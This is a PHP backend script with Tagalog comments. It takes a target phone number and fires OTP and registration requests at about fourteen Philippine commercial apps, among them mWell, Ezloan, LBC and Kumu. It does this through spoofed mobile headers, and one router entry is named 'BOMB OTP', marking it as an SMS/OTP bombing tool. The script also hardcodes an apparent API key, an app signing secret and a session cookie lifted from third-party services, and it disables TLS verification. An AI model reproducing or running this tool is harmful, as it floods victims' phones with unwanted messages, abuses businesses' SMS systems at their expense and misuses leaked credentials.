<?php
// api.php – pure backend
header('Content-Type: application/json');

// I-allow lang ang AJAX POST (para sa testing pwedeng pansamantalang tanggalin ito)
if ($_SERVER['REQUEST_METHOD'] !== 'POST' || !isset($_SERVER['HTTP_X_REQUESTED_WITH'])) {
    echo json_encode(['error' => 'Invalid request. Use AJAX POST.']);
    exit;
}

$input = json_decode(file_get_contents('php://input'), true);

if (!$input || !isset($input['action'])) {
    echo json_encode(['error' => 'Invalid request payload']);
    exit;
}

$action = $input['action'];
$phone = $input['phone'] ?? '';
$service = $input['service'] ?? '';

// Constants
define('OSIM_URL', 'https://prod.services.osim-cloud.com/identity/api/v1.0/account');
define('MWELL_API_KEY', '0a57846786b34b0a89328c39f584892b');
define('KUMU_SECRET', 'kumu_secret_2024');
define('QUICK_SESSION', 'f70a8830da63f9a280683a02cac20a3376a1adc7');

if ($action === 'send_sms') {
    $result = sendSMS($phone, $service);
    echo json_encode($result);
} else {
    echo json_encode(['error' => 'Invalid action']);
}
exit;

// ─── Helper Functions ──────────────────────────────
function formatPhone($phone) {
    $phone = preg_replace('/[\s\-+]/', '', $phone);
    if (substr($phone, 0, 1) === '0') $phone = substr($phone, 1);
    elseif (substr($phone, 0, 2) === '63') $phone = substr($phone, 2);
    return $phone;
}

function randomString($length = 32) {
    $chars = 'abcdefghijklmnopqrstuvwxyz0123456789';
    $result = '';
    for ($i = 0; $i < $length; $i++) {
        $result .= $chars[random_int(0, strlen($chars) - 1)];
    }
    return $result;
}

// ─── Router ────────────────────────────────────────
function sendSMS($phone, $service) {
    switch($service) {
        case 'BOMB OTP': return sendBombOTP($phone);
        case 'MWELL ULTRA': return sendMwellUltra($phone);
        case 'EZLOAN': return sendEzloan($phone);
        case 'XPRESS PH': return sendXpress($phone);
        case 'ABENSON': return sendAbenson($phone);
        case 'EXCELLENT LENDING': return sendExcellentLending($phone);
        case 'BISTRO': return sendBistro($phone);
        case 'WEMOVE': return sendWemove($phone);
        case 'LBC CONNECT': return sendLBC($phone);
        case 'PICKUP COFFEE': return sendPickupCoffee($phone);
        case 'HONEY LOAN': return sendHoneyLoan($phone);
        case 'KUMU PH': return sendKumuPH($phone);
        case 'S5.COM': return sendS5OTP($phone);
        case 'QUICK OTP': return sendQuickOTP($phone);
        default: return ['success' => false, 'message' => 'Unknown service'];
    }
}

// ─── Service Functions (with enhanced error reporting) ──
function curlRequest($url, $options = []) {
    $ch = curl_init($url);
    curl_setopt_array($ch, $options);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
    curl_setopt($ch, CURLOPT_TIMEOUT, 10);
    $response = curl_exec($ch);
    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    $error = curl_error($ch);
    curl_close($ch);

    if ($response === false || !empty($error)) {
        return ['success' => false, 'message' => "cURL Error: $error", 'httpCode' => $httpCode];
    }
    return ['success' => true, 'response' => $response, 'httpCode' => $httpCode];
}

function sendBombOTP($phone) {
    $formattedPhone = formatPhone($phone);
    $data = json_encode([
        "userName" => $formattedPhone,
        "phoneCode" => "63",
        "password" => "Temp" . random_int(1000, 9999) . "!"
    ]);

    $result = curlRequest(OSIM_URL . "/register", [
        CURLOPT_POST => true,
        CURLOPT_POSTFIELDS => $data,
        CURLOPT_HTTPHEADER => [
            "User-Agent: OSIM/1.55.0 (Android 16; CPH2465)",
            "Accept: application/json",
            "Content-Type: application/json",
            "accept-language: en-SG",
            "region: PH"
        ]
    ]);

    if (!$result['success']) return $result;
    if ($result['httpCode'] === 200) {
        $respData = json_decode($result['response'], true);
        if (in_array($respData['resultCode'] ?? 0, [201000, 200000])) {
            return ['success' => true, 'message' => 'Success'];
        }
        return ['success' => false, 'message' => 'Fail', 'api_response' => $respData];
    }
    return ['success' => false, 'message' => "HTTP {$result['httpCode']}"];
}

function sendMwellUltra($phone) {
    $API_URL = "https://gw.mwell.com.ph/api/v2/app/mwell/auth/sign/mobile-number";
    $API_KEY = MWELL_API_KEY;
    $formattedPhone = formatPhone($phone);
    $data = json_encode([
        "country" => "PH",
        "phoneNumber" => $formattedPhone,
        "phoneNumberPrefix" => "+63"
    ]);

    $result = curlRequest($API_URL, [
        CURLOPT_POST => true,
        CURLOPT_POSTFIELDS => $data,
        CURLOPT_HTTPHEADER => [
            "User-Agent: okhttp/4.11.0",
            "Content-Type: application/json",
            "ocp-apim-subscription-key: $API_KEY",
            "x-app-version: 03.942.035",
            "x-device-type: android",
            "x-device-model: oneplus CPH2465"
        ]
    ]);

    if (!$result['success']) return $result;
    if ($result['httpCode'] === 200) {
        $respData = json_decode($result['response'], true);
        if (isset($respData['c']) && $respData['c'] === 200) {
            return ['success' => true, 'message' => 'Sent'];
        }
        return ['success' => false, 'message' => "Err", 'api_response' => $respData];
    }
    return ['success' => false, 'message' => "HTTP {$result['httpCode']}"];
}

function sendEzloan($phone) {
    $formattedPhone = formatPhone($phone);
    $currentTime = time() * 1000;
    $data = json_encode([
        "businessId" => "EZLOAN",
        "contactNumber" => "+63$formattedPhone",
        "appsflyerIdentifier" => "$currentTime"
    ]);

    $result = curlRequest("https://gateway.ezloancash.ph/security/auth/otp/request", [
        CURLOPT_POST => true,
        CURLOPT_POSTFIELDS => $data,
        CURLOPT_HTTPHEADER => [
            "User-Agent: okhttp/4.9.2",
            "Content-Type: application/json",
            "blackbox: kGPGg{$currentTime}DCl3O8MVBR0"
        ]
    ]);

    if (!$result['success']) return $result;
    if ($result['httpCode'] === 200) {
        $respData = json_decode($result['response'], true);
        if (isset($respData['code']) && $respData['code'] === 0) {
            return ['success' => true, 'message' => 'Success'];
        }
        return ['success' => false, 'message' => 'Failed', 'api_response' => $respData];
    }
    return ['success' => false, 'message' => "HTTP {$result['httpCode']}"];
}

function sendXpress($phone) {
    $timestamp = time();
    $data = json_encode([
        "FirstName" => "U$timestamp",
        "LastName" => "T",
        "Email" => "u$timestamp@gm.com",
        "Phone" => "+63" . formatPhone($phone),
        "Password" => "Pass",
        "ConfirmPassword" => "Pass"
    ]);

    $result = curlRequest("https://api.xpress.ph/v1/api/XpressUser/CreateUser/SendOtp", [
        CURLOPT_POST => true,
        CURLOPT_POSTFIELDS => $data,
        CURLOPT_HTTPHEADER => [
            "User-Agent: Dalvik/2.1.0",
            "Content-Type: application/json"
        ]
    ]);

    if (!$result['success']) return $result;
    return ['success' => $result['httpCode'] === 200, 'message' => $result['httpCode'] === 200 ? 'Success' : "HTTP {$result['httpCode']}"];
}

function sendAbenson($phone) {
    $data = "contact_no=$phone&login_token=";

    $result = curlRequest("https://api.mobile.abenson.com/api/public/membership/activate_otp", [
        CURLOPT_POST => true,
        CURLOPT_POSTFIELDS => $data,
        CURLOPT_HTTPHEADER => [
            "User-Agent: okhttp/4.9.0",
            "Content-Type: application/x-www-form-urlencoded"
        ]
    ]);

    if (!$result['success']) return $result;
    return ['success' => $result['httpCode'] === 200, 'message' => $result['httpCode'] === 200 ? 'Success' : 'Fail'];
}

function sendExcellentLending($phone) {
    $data = json_encode([
        "domain" => $phone,
        "cat" => "login",
        "previous" => false,
        "financial" => randomString(32)
    ]);

    $result = curlRequest("https://api.excellenteralending.com/dllin/union/rehabilitation/dock", [
        CURLOPT_POST => true,
        CURLOPT_POSTFIELDS => $data,
        CURLOPT_HTTPHEADER => [
            "User-Agent: okhttp/4.12.0",
            "Content-Type: application/json"
        ]
    ]);

    if (!$result['success']) return $result;
    return ['success' => $result['httpCode'] === 200, 'message' => $result['httpCode'] === 200 ? 'Success' : 'Fail'];
}

function sendBistro($phone) {
    $formattedPhone = formatPhone($phone);
    $url = "https://bistrobff-adminservice.arlo.com.ph:9001/api/v1/customer/loyalty/otp?mobileNumber=63$formattedPhone";

    $result = curlRequest($url, [
        CURLOPT_HTTPHEADER => [
            "User-Agent: Mozilla/5.0 (Linux; Android 16)",
            "x-requested-with: com.allcardtech.bistro"
        ]
    ]);

    if (!$result['success']) return $result;
    if ($result['httpCode'] === 200) {
        $respData = json_decode($result['response'], true);
        if (isset($respData['isSuccessful']) && $respData['isSuccessful']) {
            return ['success' => true, 'message' => 'Success'];
        }
        return ['success' => false, 'message' => 'Fail', 'api_response' => $respData];
    }
    return ['success' => false, 'message' => 'Fail'];
}

function sendWemove($phone) {
    $data = json_encode([
        "phone_country" => "+63",
        "phone_no" => formatPhone($phone)
    ]);

    $result = curlRequest("https://api.wemove.com.ph/auth/users", [
        CURLOPT_POST => true,
        CURLOPT_POSTFIELDS => $data,
        CURLOPT_HTTPHEADER => [
            "User-Agent: okhttp/4.9.3",
            "Content-Type: application/json"
        ]
    ]);

    if (!$result['success']) return $result;
    return ['success' => $result['httpCode'] === 200, 'message' => $result['httpCode'] === 200 ? 'Success' : 'Fail'];
}

function sendLBC($phone) {
    $data = http_build_query([
        "verification_type" => "mobile",
        "client_contact_no" => formatPhone($phone)
    ]);

    $result = curlRequest("https://lbcconnect.lbcapps.com/lbcconnectAPISprint2BPSGC/AClientThree/processInitRegistrationVerification", [
        CURLOPT_POST => true,
        CURLOPT_POSTFIELDS => $data,
        CURLOPT_HTTPHEADER => [
            "User-Agent: Dart/2.19",
            "Content-Type: application/x-www-form-urlencoded"
        ]
    ]);

    if (!$result['success']) return $result;
    return ['success' => $result['httpCode'] === 200, 'message' => $result['httpCode'] === 200 ? 'Success' : 'Fail'];
}

function sendPickupCoffee($phone) {
    $data = json_encode([
        "mobile_number" => "+63" . formatPhone($phone),
        "login_method" => "mobile_number"
    ]);

    $result = curlRequest("https://production.api.pickup-coffee.net/v2/customers/login", [
        CURLOPT_POST => true,
        CURLOPT_POSTFIELDS => $data,
        CURLOPT_HTTPHEADER => [
            "User-Agent: okhttp/4.12.0",
            "Content-Type: application/json"
        ]
    ]);

    if (!$result['success']) return $result;
    return ['success' => $result['httpCode'] === 200, 'message' => $result['httpCode'] === 200 ? 'Success' : 'Fail'];
}

function sendHoneyLoan($phone) {
    $data = json_encode([
        "phone" => $phone,
        "is_rights_block_accepted" => 1
    ]);

    $result = curlRequest("https://api.honeyloan.ph/api/client/registration/step-one", [
        CURLOPT_POST => true,
        CURLOPT_POSTFIELDS => $data,
        CURLOPT_HTTPHEADER => [
            "User-Agent: Mozilla/5.0",
            "Content-Type: application/json"
        ]
    ]);

    if (!$result['success']) return $result;
    if ($result['httpCode'] === 200) {
        $respData = json_decode($result['response'], true);
        if (isset($respData['success']) && $respData['success']) {
            return ['success' => true, 'message' => 'Success'];
        }
        return ['success' => false, 'message' => 'Fail', 'api_response' => $respData];
    }
    return ['success' => false, 'message' => 'Fail'];
}

function sendKumuPH($phone) {
    $formattedPhone = formatPhone($phone);
    $ts = time();
    $randomStr = randomString(32);
    $sig = hash('sha256', $ts . $randomStr . $formattedPhone . KUMU_SECRET);

    $data = json_encode([
        "country_code" => "+63",
        "cellphone" => $formattedPhone,
        "encrypt_signature" => $sig,
        "encrypt_timestamp" => $ts
    ]);

    $result = curlRequest("https://api.kumuapi.com/v2/user/sendverifysms", [
        CURLOPT_POST => true,
        CURLOPT_POSTFIELDS => $data,
        CURLOPT_HTTPHEADER => ["Content-Type: application/json"]
    ]);

    if (!$result['success']) return $result;
    if ($result['httpCode'] === 200 || $result['httpCode'] === 403) {
        return ['success' => true, 'message' => 'Success'];
    }
    return ['success' => false, 'message' => 'Fail'];
}

function sendS5OTP($phone) {
    $normalizedPhone = "+63" . formatPhone($phone);
    $boundary = "----WebKitFormBoundary7MA4YWxkTrZu0gW";
    $body = "--$boundary\r\nContent-Disposition: form-data; name=\"phone_number\"\r\n\r\n$normalizedPhone\r\n--$boundary--\r\n";

    $result = curlRequest("https://api.s5.com/player/api/v1/otp/request", [
        CURLOPT_POST => true,
        CURLOPT_POSTFIELDS => $body,
        CURLOPT_HTTPHEADER => ["content-type: multipart/form-data; boundary=$boundary"]
    ]);

    if (!$result['success']) return $result;
    return ['success' => $result['httpCode'] === 200, 'message' => $result['httpCode'] === 200 ? 'Success' : 'Fail'];
}

function sendQuickOTP($phone) {
    $target = "63" . formatPhone($phone);
    $data = json_encode(["params" => ["mobile" => $target]]);

    $result = curlRequest("https://staging.2bo.app/v1/send_otp", [
        CURLOPT_POST => true,
        CURLOPT_POSTFIELDS => $data,
        CURLOPT_HTTPHEADER => [
            "Cookie: session_id=" . QUICK_SESSION,
            "Content-Type: application/json"
        ]
    ]);

    if (!$result['success']) return $result;
    return ['success' => $result['httpCode'] === 200, 'message' => $result['httpCode'] === 200 ? 'Success' : 'Fail'];
}